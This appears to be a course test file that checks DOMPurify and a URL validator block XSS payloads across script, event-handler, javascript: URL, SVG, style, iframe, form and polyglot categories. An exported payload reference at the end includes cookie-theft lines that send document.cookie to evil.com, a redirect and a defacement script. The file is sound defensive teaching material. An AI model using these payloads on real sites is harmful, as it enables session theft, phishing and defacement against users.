/**
 * XSS Prevention Tests
 * ====================
 * Course: GitHub Copilot for Cybersecurity Specialists
 * Lesson: 01 - Vulnerability Detection
 *
 * These tests verify that XSS attacks are properly blocked.
 * Tests should PASS when the secure components are used.
 *
 * Run with: npm test
 *
 * Copilot Chat Prompt:
 * "Generate React Testing Library tests that attempt XSS injection.
 *  Include payloads: script tags, event handlers, javascript: URLs.
 *  Tests should pass if XSS is blocked."
 */

import React from 'react';
import { render, screen, fireEvent } from '@testing-library/react';
import '@testing-library/jest-dom';
import DOMPurify from 'dompurify';

// Import secure component
import UserProfile from '../secure-react-app/UserProfile';

describe('XSS Prevention Tests', () => {

  // =========================================================================
  // Test Category 1: Script Tag Injection
  // =========================================================================
  describe('Script Tag Prevention', () => {

    test('should sanitize basic script tags', () => {
      const maliciousInput = '<script>alert("XSS")</script>';
      const sanitized = DOMPurify.sanitize(maliciousInput, { ALLOWED_TAGS: [] });

      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
    });

    test('should sanitize script tags with different cases', () => {
      const payloads = [
        '<SCRIPT>alert("XSS")</SCRIPT>',
        '<ScRiPt>alert("XSS")</ScRiPt>',
        '<script type="text/javascript">alert("XSS")</script>',
        '<script src="http://evil.com/xss.js"></script>'
      ];

      payloads.forEach(payload => {
        const sanitized = DOMPurify.sanitize(payload);
        expect(sanitized).not.toMatch(/<script/i);
      });
    });

    test('should remove script from DOM when component renders', () => {
      const { container } = render(<UserProfile />);

      // Verify no script tags exist in rendered output
      const scripts = container.querySelectorAll('script');
      expect(scripts.length).toBe(0);
    });

  });

  // =========================================================================
  // Test Category 2: Event Handler Injection
  // =========================================================================
  describe('Event Handler Prevention', () => {

    test('should strip onerror event handlers', () => {
      const maliciousInput = '<img src=x onerror="alert(\'XSS\')">';
      const sanitized = DOMPurify.sanitize(maliciousInput);

      // Image tag might remain but onerror should be stripped
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('alert');
    });

    test('should strip onload event handlers', () => {
      const payloads = [
        '<body onload="alert(\'XSS\')">',
        '<svg onload="alert(\'XSS\')">',
        '<iframe onload="alert(\'XSS\')">',
      ];

      payloads.forEach(payload => {
        const sanitized = DOMPurify.sanitize(payload);
        expect(sanitized).not.toContain('onload');
      });
    });

    test('should strip onclick event handlers', () => {
      const maliciousInput = '<div onclick="alert(\'XSS\')">Click me</div>';
      const sanitized = DOMPurify.sanitize(maliciousInput);

      expect(sanitized).not.toContain('onclick');
    });

    test('should strip onmouseover event handlers', () => {
      const maliciousInput = '<a onmouseover="alert(\'XSS\')">Hover me</a>';
      const sanitized = DOMPurify.sanitize(maliciousInput);

      expect(sanitized).not.toContain('onmouseover');
    });

    test('should strip onfocus event handlers', () => {
      const maliciousInput = '<input onfocus="alert(\'XSS\')" autofocus>';
      const sanitized = DOMPurify.sanitize(maliciousInput);

      expect(sanitized).not.toContain('onfocus');
    });

  });

  // =========================================================================
  // Test Category 3: JavaScript URL Prevention
  // =========================================================================
  describe('JavaScript URL Prevention', () => {

    test('should block javascript: protocol in href', () => {
      const maliciousInput = '<a href="javascript:alert(\'XSS\')">Click</a>';
      const sanitized = DOMPurify.sanitize(maliciousInput, {
        ALLOWED_TAGS: ['a'],
        ALLOWED_ATTR: ['href']
      });

      expect(sanitized).not.toContain('javascript:');
    });

    test('should block javascript: with various encodings', () => {
      const payloads = [
        '<a href="javascript:alert(1)">',
        '<a href="java\nscript:alert(1)">',
        '<a href="java\tscript:alert(1)">',
        '<a href="java&#x0A;script:alert(1)">',
        '<a href="&#106;avascript:alert(1)">',
      ];

      payloads.forEach(payload => {
        const sanitized = DOMPurify.sanitize(payload);
        // Should either block the link or remove javascript:
        expect(sanitized.toLowerCase()).not.toMatch(/javascript\s*:/);
      });
    });

    test('should block data: URLs with scripts', () => {
      const maliciousInput = '<a href="data:text/html,<script>alert(1)</script>">Click</a>';
      const sanitized = DOMPurify.sanitize(maliciousInput);

      expect(sanitized).not.toContain('<script>');
    });

  });

  // =========================================================================
  // Test Category 4: SVG-based XSS Prevention
  // =========================================================================
  describe('SVG XSS Prevention', () => {

    test('should sanitize SVG with embedded script', () => {
      const maliciousInput = '<svg><script>alert("XSS")</script></svg>';
      const sanitized = DOMPurify.sanitize(maliciousInput);

      expect(sanitized).not.toContain('<script>');
    });

    test('should strip SVG onload handlers', () => {
      const maliciousInput = '<svg onload="alert(\'XSS\')">';
      const sanitized = DOMPurify.sanitize(maliciousInput);

      expect(sanitized).not.toContain('onload');
    });

    test('should sanitize SVG animate with JS', () => {
      const maliciousInput = `
        <svg>
          <animate attributeName="href" values="javascript:alert(1)"/>
        </svg>
      `;
      const sanitized = DOMPurify.sanitize(maliciousInput);

      expect(sanitized.toLowerCase()).not.toContain('javascript:');
    });

  });

  // =========================================================================
  // Test Category 5: Style-based XSS Prevention
  // =========================================================================
  describe('Style XSS Prevention', () => {

    test('should block style tags with expressions', () => {
      const maliciousInput = '<style>*{background:url("javascript:alert(1)")}</style>';
      const sanitized = DOMPurify.sanitize(maliciousInput);

      expect(sanitized).not.toContain('<style>');
      expect(sanitized.toLowerCase()).not.toContain('javascript:');
    });

    test('should block inline style with expression', () => {
      // Note: expression() is IE-specific but should still be blocked
      const maliciousInput = '<div style="background:expression(alert(1))">Test</div>';
      const sanitized = DOMPurify.sanitize(maliciousInput);

      expect(sanitized).not.toContain('expression');
    });

  });

  // =========================================================================
  // Test Category 6: iframe Prevention
  // =========================================================================
  describe('iframe Prevention', () => {

    test('should block iframe injection', () => {
      const maliciousInput = '<iframe src="http://evil.com"></iframe>';
      const sanitized = DOMPurify.sanitize(maliciousInput);

      expect(sanitized).not.toContain('<iframe');
    });

    test('should block iframe with srcdoc', () => {
      const maliciousInput = '<iframe srcdoc="<script>alert(1)</script>"></iframe>';
      const sanitized = DOMPurify.sanitize(maliciousInput);

      expect(sanitized).not.toContain('<iframe');
      expect(sanitized).not.toContain('<script>');
    });

  });

  // =========================================================================
  // Test Category 7: Form Injection Prevention
  // =========================================================================
  describe('Form Injection Prevention', () => {

    test('should block form injection for phishing', () => {
      const maliciousInput = `
        <form action="http://evil.com/steal">
          <input name="password" type="password">
          <input type="submit" value="Login">
        </form>
      `;
      const sanitized = DOMPurify.sanitize(maliciousInput);

      expect(sanitized).not.toContain('<form');
      expect(sanitized).not.toContain('<input');
    });

  });

  // =========================================================================
  // Test Category 8: Polyglot XSS Prevention
  // =========================================================================
  describe('Polyglot XSS Prevention', () => {

    test('should handle complex polyglot payloads', () => {
      const polyglots = [
        `jaVasCript:/*-/*\`/*\\'//*"/**/(/* */oNcLiCk=alert() )//`,
        `<img src=x onerror="&#97;lert(1)">`,
        `<svg/onload=alert(1)>`,
        `<body onpageshow=alert(1)>`,
        `<input onfocus=alert(1) autofocus>`,
        `<marquee onstart=alert(1)>`,
        `<video><source onerror=alert(1)>`,
        `<audio src=x onerror=alert(1)>`,
      ];

      polyglots.forEach(payload => {
        const sanitized = DOMPurify.sanitize(payload);
        // Should not contain any event handlers or javascript:
        expect(sanitized).not.toMatch(/on\w+\s*=/i);
        expect(sanitized.toLowerCase()).not.toContain('javascript:');
        expect(sanitized).not.toContain('alert');
      });
    });

  });

  // =========================================================================
  // Test Category 9: URL Validation
  // =========================================================================
  describe('URL Validation', () => {

    const isValidUrl = (urlString) => {
      try {
        const url = new URL(urlString);
        return ['http:', 'https:'].includes(url.protocol);
      } catch {
        return false;
      }
    };

    test('should accept valid HTTPS URLs', () => {
      expect(isValidUrl('https://example.com')).toBe(true);
      expect(isValidUrl('https://example.com/path')).toBe(true);
      expect(isValidUrl('https://sub.example.com')).toBe(true);
    });

    test('should accept valid HTTP URLs', () => {
      expect(isValidUrl('http://example.com')).toBe(true);
    });

    test('should reject javascript: URLs', () => {
      expect(isValidUrl('javascript:alert(1)')).toBe(false);
    });

    test('should reject data: URLs', () => {
      expect(isValidUrl('data:text/html,<script>alert(1)</script>')).toBe(false);
    });

    test('should reject vbscript: URLs', () => {
      expect(isValidUrl('vbscript:alert(1)')).toBe(false);
    });

    test('should reject invalid URLs', () => {
      expect(isValidUrl('not a url')).toBe(false);
      expect(isValidUrl('')).toBe(false);
    });

  });

  // =========================================================================
  // Test Category 10: CSP Header Validation
  // =========================================================================
  describe('CSP Header Validation', () => {

    test('CSP should have script-src directive', () => {
      const cspHeader = "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'";

      expect(cspHeader).toContain("script-src");
      expect(cspHeader).not.toContain("'unsafe-eval'");
    });

    test('CSP should block unsafe-eval', () => {
      const secureCsp = "default-src 'self'; script-src 'self'";

      expect(secureCsp).not.toContain('unsafe-eval');
    });

    test('CSP should have frame-ancestors for clickjacking protection', () => {
      const cspHeader = "frame-ancestors 'none'";

      expect(cspHeader).toContain("frame-ancestors");
    });

  });

});

// =========================================================================
// XSS Payload Reference (for educational purposes)
// =========================================================================
export const XSS_PAYLOADS = {
  basic: [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
  ],
  event_handlers: [
    '<div onmouseover="alert(\'XSS\')">',
    '<input onfocus="alert(\'XSS\')" autofocus>',
    '<body onload="alert(\'XSS\')">',
    '<marquee onstart="alert(\'XSS\')">',
  ],
  javascript_urls: [
    '<a href="javascript:alert(\'XSS\')">Click</a>',
    '<iframe src="javascript:alert(\'XSS\')">',
  ],
  encoding_bypass: [
    '<img src=x onerror="&#97;lert(1)">',
    '<a href="&#106;avascript:alert(1)">',
    '<script>\\u0061lert(1)</script>',
  ],
  cookie_theft: [
    '<script>new Image().src="http://evil.com/?c="+document.cookie</script>',
    '<img src=x onerror="fetch(\'http://evil.com/?c=\'+document.cookie)">',
  ],
  dom_manipulation: [
    '<script>document.body.innerHTML="<h1>Defaced!</h1>"</script>',
    '<script>document.location="http://evil.com"</script>',
  ]
};
